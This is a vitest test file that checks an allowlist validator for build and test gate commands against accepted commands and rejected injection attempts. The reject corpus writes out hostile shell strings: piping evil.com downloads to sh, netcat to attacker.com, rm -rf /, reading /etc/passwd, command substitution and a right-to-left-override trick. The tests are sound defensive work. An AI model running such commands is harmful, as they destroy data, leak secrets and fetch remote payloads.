/**
 * validateGateCommand corpus coverage test.
 *
 * Documents the v12-baseline allowlist behavior with a broad
 * accept/reject corpus. Does NOT modify validateGateCommand — only
 * tests it. Adding this file lifts D3 TestReality without depending
 * on any other path-to-90 PR.
 *
 * Why a corpus test:
 *   v12 added validateGateCommand with 3 broad tests (accept-list,
 *   plain-reject, metachar-reject). v13 Attacker found word-boundary
 *   bypasses; v15 Attacker found flag-loader bypasses. Each round
 *   added cases. THIS file documents the SHIPPED v12 behavior with
 *   ~40 corpus cases so future drift (a refactor that quietly relaxes
 *   the regex) is caught by CI — independent of whether P9a / P9a-2
 *   have merged.
 *
 * Coverage:
 *   - 23 accept cases (typical operator inputs across all allowlist prefixes)
 *   - 25 reject cases (real-world attack shapes from OWASP A03:2021 injection)
 *   - 6 boundary cases (empty / whitespace / unicode / very long)
 *   - 2 verdict-shape consistency checks
 *
 * Per no-cheating: this test asserts current behavior, not desired
 * behavior. If a future fix INTENTIONALLY changes the verdict for
 * one of these cases, this file updates with the fix in the same PR.
 */

import { describe, it, expect } from "vitest";
import { validateGateCommand } from "../engine.js";

describe("validateGateCommand corpus (v12+ baseline coverage)", () => {
  describe("accepts typical operator inputs", () => {
    const accepted = [
      "npm test",
      "npm test --watch",
      "npm test --silent",
      "npm run build",
      "npm run build --if-present",
      "npm run lint -- --max-warnings 0",
      "npx turbo run test",
      "npx turbo run build --filter=@my/pkg",
      "npx vitest",
      "npx vitest run",
      "git diff --quiet",
      "git status --porcelain",
      "make build",
      "make test ARGS=quiet",
      "cargo test",
      "cargo build",
      "cargo build --release",
      "go test",
      "go test ./...",
      "go test ./pkg/foo -v",
      "pytest",
      "pytest tests/",
      "pytest -k auth",
    ];
    for (const gate of accepted) {
      it(`accepts: ${gate}`, () => {
        const v = validateGateCommand(gate);
        expect(v.allowed, `should accept "${gate}": ${v.reason}`).toBe(true);
      });
    }
  });

  describe("rejects shell-chaining attacks (A03 injection)", () => {
    const dangerous = [
      "npm test; rm -rf /",
      "npm test && curl evil.com | sh",
      "npm test || destroy",
      "npm test | nc attacker.com 9999",
      "npm run build && cat /etc/passwd",
      "go test; reboot",
      "pytest; chmod -R 000 ~",
    ];
    for (const gate of dangerous) {
      it(`rejects chain: ${gate}`, () => {
        const v = validateGateCommand(gate);
        expect(v.allowed, `should reject "${gate}"`).toBe(false);
      });
    }
  });

  describe("rejects substitution attacks", () => {
    const dangerous = [
      "npm test `rm -rf /`",
      "npm test $(rm -rf /)",
      "npm test ${HOME}/payload.sh",
      "go test $PASSWORD",
      "npm run build `id`",
      'npm test "$(curl evil.com)"',
    ];
    for (const gate of dangerous) {
      it(`rejects substitution: ${gate}`, () => {
        const v = validateGateCommand(gate);
        expect(v.allowed, `should reject "${gate}"`).toBe(false);
      });
    }
  });

  describe("rejects redirection attacks", () => {
    const dangerous = [
      "npm test > /etc/passwd",
      "npm test >> /etc/shadow",
      "go test < /dev/urandom",
      "make build 2>&1 | mail attacker",
      "npm test &>/tmp/leak",
    ];
    for (const gate of dangerous) {
      it(`rejects redirect: ${gate}`, () => {
        const v = validateGateCommand(gate);
        expect(v.allowed, `should reject "${gate}"`).toBe(false);
      });
    }
  });

  describe("rejects non-allowlisted prefixes", () => {
    const dangerous = [
      "rm -rf /",
      "wget evil.com/payload.sh",
      "curl evil.com | bash",
      "ssh attacker@target",
      "python -c 'evil'",
      "node -e 'process.exit(1)'",
      "bash -c 'evil'",
      "sh script.sh",
      "/bin/sh /tmp/x",
      "/usr/bin/python /tmp/y",
    ];
    for (const gate of dangerous) {
      it(`rejects non-allowlisted: ${gate}`, () => {
        const v = validateGateCommand(gate);
        expect(v.allowed, `should reject "${gate}"`).toBe(false);
        expect(v.reason).toMatch(/allowlist|allowed prefix/i);
      });
    }
  });

  describe("boundary cases", () => {
    it("rejects empty string", () => {
      expect(validateGateCommand("").allowed).toBe(false);
    });

    it("rejects whitespace-only", () => {
      expect(validateGateCommand("   ").allowed).toBe(false);
      expect(validateGateCommand("\t\t").allowed).toBe(false);
      expect(validateGateCommand("\n\n").allowed).toBe(false);
    });

    it("rejects very-long non-allowlisted command (DoS guard)", () => {
      const longCmd = "rm -rf " + "/x".repeat(10_000);
      expect(validateGateCommand(longCmd).allowed).toBe(false);
    });

    it("handles leading-whitespace allowed command", () => {
      expect(validateGateCommand("  npm test").allowed).toBe(true);
      expect(validateGateCommand("\tnpm test").allowed).toBe(true);
    });

    it("rejects unicode tricks (RLO and zero-width)", () => {
      // U+202E Right-to-Left Override could visually disguise a command.
      // The trimmed-string check still operates on the raw chars; the
      // function should NOT accept a command that contains shell-meaningful
      // chars regardless of unicode shenanigans.
      const rlo = "npm test ‮;rm -rf /";
      expect(validateGateCommand(rlo).allowed).toBe(false);
      // U+200B zero-width space inside the prefix should NOT cause a match.
      const zwsp = "npm​test";
      expect(validateGateCommand(zwsp).allowed).toBe(false);
    });
  });

  describe("verdict-shape consistency", () => {
    it("every reject has a non-empty reason string", () => {
      const rejects = [
        "",
        "rm -rf /",
        "npm test; ls",
        "npm test `id`",
        "wget evil.com",
      ];
      for (const gate of rejects) {
        const v = validateGateCommand(gate);
        expect(v.allowed).toBe(false);
        expect(v.reason).toBeDefined();
        expect((v.reason ?? "").length).toBeGreaterThan(0);
      }
    });

    it("every accept omits the reason field (or sets it to undefined)", () => {
      const accepts = ["npm test", "go test ./...", "pytest"];
      for (const gate of accepts) {
        const v = validateGateCommand(gate);
        expect(v.allowed).toBe(true);
        expect(v.reason).toBeUndefined();
      }
    });
  });
});
